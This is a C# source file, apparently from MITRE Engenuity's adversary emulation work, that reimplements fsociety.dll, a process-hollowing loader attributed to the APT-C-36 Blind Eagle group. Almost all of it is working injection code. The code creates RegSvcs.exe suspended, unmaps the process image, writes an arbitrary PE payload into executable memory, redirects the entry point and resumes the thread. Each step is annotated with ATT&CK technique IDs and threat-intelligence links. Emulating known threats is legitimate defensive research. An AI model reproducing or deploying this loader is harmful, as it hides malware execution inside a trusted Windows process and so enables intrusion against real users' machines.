/*
# ---------------------------------------------------------------------------
# fsociety.dll
        summary:
            fsociety.dll is a dll used by APT-C-36 Blind Eagle to perform process hollowing and inject a paylaod into an                  arbitrary Windows executable, typically RegSvcs.exe
            The DLL is heavily based on code from Nyan Cat's Lime-Crypters runPE class (https://github.com/NYAN-x-CAT/Lime-               Crypter/blob/master/Lime-Crypter/Resources/Stub.cs)

 # © 2023 MITRE Engenuity, LLC. Approved for Public Release. Document number CT0076
 
 # Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at

 # http://www.apache.org/licenses/LICENSE-2.0

 # Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.

 # This project makes use of ATT&CK®
 # ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/ 

# Revision History:

# ---------------------------------------------------------------------------
*/

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;

namespace fsociety
{

    public class Tools
    {
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, EntryPoint = "CreateProcess")]
        private static extern bool CreateProcess_API(string applicationName, string commandLIne, IntPtr processAttribute, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref Tools.STARTUP_INFORMATION startupInfo, ref Tools.PROCESS_INFORMATION processInformation);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll", EntryPoint = "GetThreadContext")]
        private static extern bool GetThreadContext_API(IntPtr thread, int[] context);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll", EntryPoint = "Wow64GetThreadContext")]
        private static extern bool Wow64GetThreadContext_API(IntPtr thread, int[] context);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll", EntryPoint = "SetThreadContext")]
        private static extern bool SetThreadContext_API(IntPtr thread, int[] context);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll", EntryPoint = "Wow64SetThreadContext")]
        private static extern bool Wow64SetThreadContext_API(IntPtr thread, int[] context);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory")]
        private static extern bool ReadProcessMemory_API(IntPtr process, int baseAddress, ref int buffer, int headerSize, ref int bytesRead);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory")]
        private static extern bool WriteProcessMemory_API(IntPtr process, int baseAddress, byte[] buffer, int headerSize, ref int bytesWritten);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("ntdll.dll", EntryPoint = "NtUnmapViewOfSection")]
        private static extern int NtUnmapViewOfSection_API(IntPtr process, int baseAddress);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx")]
        private static extern int VirtualAllocEx_API(IntPtr handle, int address, int length, int type, int protect);

        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll", EntryPoint = "ResumeThread")]
        private static extern int ResumeThread_API(IntPtr handle);

        /*
        Ande
            About:
                Function used to call RunHandle and facilitate process hollowing
            Result:
                Will return True or False based on success of process hollowing
            MITRE ATT&CK Techniques:
                T1055.102 Process Hollowing
            CTI:
                https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia
                https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/
        */
        public static bool Ande(string path, byte[] data)
        {
            for (int I = 1; I <= 5; I++ );
                if (Tools.RunHandle(path, string.Empty, data, true))
                {
                    return true;
                }
            return false;

        }

        /*
        HandleRun
            About:
                Function that performs process hollowing and injects a payload into a remote process.
                The function forgoes using ZwQueryInformationProcess to read the PEB and calculate the Image Base Addres
                and instead leverages a Context array from GetThreadContext / Wow64GetThreadContext and ReadProcessMemeory
            Result:
                An attempt will be made to inject the implant passed as the data variable into the process passed as the path variable
                If successful the function will return the result of True, and if not will return False
            MITRE ATT&CK Techniques:
                T1055.102 Process Hollowing
            CTI:
                https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia
                https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/
        */
        private static bool HandleRun(string path, string cmd, byte[] data, bool compatible)
        {
            string text = Tools.FormatPath("\"{0}\"", path);

            int readWrite = 0;

            // Instntiate process information and startup information structs
            Tools.STARTUP_INFORMATION startup_INFORMATION = default(Tools.STARTUP_INFORMATION);
            Tools.PROCESS_INFORMATION process_INFORMATION = default(Tools.PROCESS_INFORMATION);
            startup_INFORMATION.dwFlags = 0;
            startup_INFORMATION.Size_ = (uint)Tools.MarshalSize(Tools.GetRuntimeTypeHandle(typeof(Tools.STARTUP_INFORMATION).TypeHandle));

            try
            {
                // Create process: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe
                if (!Tools.CreateProcess_API(path, text, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, ref startup_INFORMATION, ref process_INFORMATION))
                {                    
                    throw new Exception();
                }
                // set variables for the address and imagebase of the payload
                int dataAddress = Tools.convertBytes32(data, 60);
                int imageBase = Tools.convertBytes32(data, dataAddress + 52);
                // prepare array to hold thread context
                int[] contextArray = new int[179];
                contextArray[0] = 65538;
                
                // determine if thread is 32 or 64 bit
                if (Tools.Size() == 4)
                {
                    if (!Tools.GetThreadContext_API(process_INFORMATION.ThreadHandle, contextArray))
                    {                        
                        throw new Exception();
                    }
                }
                else
                {
                    if (!Tools.Wow64GetThreadContext_API(process_INFORMATION.ThreadHandle, contextArray))
                    {                        
                        throw new Exception();
                    }
                }
                // set location of ebx 
                int ebx = contextArray[41];
                int baseAddress = 0;
                // read process memory of RegSvcs.exe
                if (!Tools.ReadProcessMemory_API(process_INFORMATION.ProcessHandle, ebx + 8, ref baseAddress, 4, ref readWrite))
                {                   
                    throw new Exception();
                }
                // compare image base of RegSvcs.exe with base address of the payload
                if (imageBase == baseAddress)
                    // unmap process memory of victim process
                    if (Tools.NtUnmapViewOfSection_API(process_INFORMATION.ProcessHandle, baseAddress) != 0)
                    {                   
                        throw new Exception();
                    }
                // calculate length, and headersize of paylaod - allocate virtual memory
                int length = Tools.convertBytes32(data, dataAddress + 80);
                int headerSize = Tools.convertBytes32(data, dataAddress + 84);
                int newImageBase = Tools.VirtualAllocEx_API(process_INFORMATION.ProcessHandle, imageBase, length, 12288, 64);

                if (newImageBase == 0)
                {
                    Console.WriteLine($"newImageBase was zero: {newImageBase}");
                    throw new Exception();
                }
                // write the first portion of the payload to the victim process
                if (!Tools.WriteProcessMemory_API(process_INFORMATION.ProcessHandle, newImageBase, data, headerSize, ref readWrite))
                {                   
                    throw new Exception();
                }
                // calculate offset and number of sections
                int sectionOffset = dataAddress + 248;
                int numberOfSections = (int)Tools.ConvertToInt16(data, dataAddress + 6);
                for (int I = 0; I < numberOfSections; I++)
                {
                    int virtualAddress = Tools.convertBytes32(data, sectionOffset + 12);
                    int sizeOfRawData = Tools.convertBytes32(data, sectionOffset + 16);
                    int pointerToRawData = Tools.convertBytes32(data, sectionOffset + 20);
                    if (sizeOfRawData != 0)
                    {
                        // create byte array of remaining data and copy into array
                        byte[] sectionData = new byte[sizeOfRawData];
                        Tools.CopyByBlock(data, pointerToRawData, sectionData, 0, sectionData.Length);
                        // write remaining payload to the victim process RegSvcs.exe
                        if (!Tools.WriteProcessMemory_API(process_INFORMATION.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite))
                        {                           
                            throw new Exception();
                        }
                    }
                    sectionOffset += 40;
                }
                // final write of data from the allocated memory
                byte[] pointerData = (byte[])Tools.GetTheBytes(newImageBase);
                if (!Tools.WriteProcessMemory_API(process_INFORMATION.ProcessHandle, ebx + 8, pointerData, 4, ref readWrite))
                {                    
                    throw new Exception();
                }
                // Set Entry Point Address
                int entryPointAddress = Tools.convertBytes32(data, dataAddress + 40);
                if (!compatible)
                {
                    newImageBase = imageBase;
                }
                // Place entry point in thread context aray
                contextArray[44] = newImageBase + entryPointAddress;

                // determine if 32 or 64 bit
                if (Tools.Size() == 4)
                {
                    // set thread context to point to new entry point
                    if (!Tools.SetThreadContext_API(process_INFORMATION.ThreadHandle, contextArray))
                    {                       
                        throw new Exception();
                    }
                }
                else
                {
                    if (!Tools.Wow64GetThreadContext_API(process_INFORMATION.ThreadHandle, contextArray))
                    {                       
                        throw new Exception();
                    }
                }
                // resume thread to execute payload
                if (Tools.ResumeThread_API(process_INFORMATION.ThreadHandle) == -1)
                {                   
                    throw new Exception();
                }
            }
            catch
            {
                // if there is an error kill the process and return false
                Process process = (Process)Tools.GetProcessWithId((int)process_INFORMATION.ProcessId);
                process.Kill();
                return false;

            }
            return true;

        }

        internal static bool RunHandle(string path, string cmd, byte[] data, bool compatible)
        {
            return Tools.HandleRun(path, cmd, data, compatible);
        }

        internal static string FormatPath(string format, string path)
        {
            return string.Format(format, path);
        }

        internal static Type GetRuntimeHandle(RuntimeTypeHandle typeHandle)
        {
            return Type.GetTypeFromHandle(typeHandle);
        }

        internal static int MarshalSize(Type data)
        {
            return Marshal.SizeOf(data);
        }

        internal static Type GetRuntimeTypeHandle(RuntimeTypeHandle handle)
        {
            return Type.GetTypeFromHandle(handle);
        }

        internal static int convertBytes32(byte[] bytes, int startIndex)
        {
            return BitConverter.ToInt32(bytes, startIndex);
        }

        internal static int Size()
        {
            return IntPtr.Size;
        }

        internal static short ConvertToInt16(byte[] A_0, int A_1)
        {
            return BitConverter.ToInt16(A_0, A_1);
        }

        internal static void CopyByBlock(Array A_0, int A_1, Array A_2, int A_3, int A_4)
        {
            Buffer.BlockCopy(A_0, A_1, A_2, A_3, A_4);
        }

        internal static object GetTheBytes(int A_0)
        {
            return BitConverter.GetBytes(A_0);
        }

        internal static object GetProcessWithId(int A_0)
        {
            return Process.GetProcessById(A_0);
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct PROCESS_INFORMATION
        {

            public IntPtr ProcessHandle;


            public IntPtr ThreadHandle;


            public uint ProcessId;


            public uint ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct STARTUP_INFORMATION
        {

            public uint Size_;


            public string Reserved1;


            public string Desktop;


            public string Title;


            public int dwX;


            public int dwY;


            public int dwXSize;


            public int dwYSize;


            public int dwXCountChars;


            public int dwYCountChars;


            public int dwFillAttribute;


            public int dwFlags;


            //  Show Window
            public short wShowWindow;


            public short cbReserved2;


            public IntPtr Reserved2;


            public IntPtr StdInput;


            public IntPtr StdOutput;

            public IntPtr StdError;
        }



    }
}
